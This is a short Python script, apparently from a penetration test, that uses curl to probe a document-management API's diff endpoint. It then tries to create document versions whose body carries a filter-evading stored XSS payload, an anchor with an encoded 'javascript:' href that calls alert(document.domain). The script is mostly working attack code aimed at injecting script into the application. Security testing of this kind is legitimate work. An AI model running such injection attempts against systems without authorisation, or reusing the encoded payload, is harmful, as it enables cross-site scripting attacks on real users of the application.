import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TT=open('/tmp/bac_TESTER').read().strip()
def req(m,p,body=None,tok=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X',m,H+p,
         '-H','token: '+(tok or TT),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== does htmldiff echo body content verbatim? (diff = render sink) ===")
c,b=req('GET','/api/v1/documents/330/diff?from=1371&to=1371')
print(f"  {c}")
try:
    d=json.loads(b)
    print(f"  htmldiff = {d.get('htmldiff')!r}")
    print(f"  is_flattened={d.get('is_flattened')}")
except: print("  ",b[:200])
print()
print("=== create a NEW document version with a payload, then diff it ===")
tag='ZXV'+uuid.uuid4().hex[:5]
# try creating a document version via POST
for body in [
  {"document_version":{"document_id":330,"body":f'<p><a href="javas%63ript:alert(document.domain)">{tag}</a></p>'}},
  {"document_version":{"documentId":330,"body":f'<p><a href="javas%63ript:alert(document.domain)">{tag}</a></p>'}},
]:
    c,b=req('POST','/api/v1/document_versions',body)
    print(f"  POST docver -> {c} {b[:130].replace(chr(10),' ')}")
    if c in ('200','201'):
        try:
            o=json.loads(b)['document_versions'][0]
            print(f"    new id={o['id']} body={str(o.get('body'))[:100]!r}")
        except: pass
        break
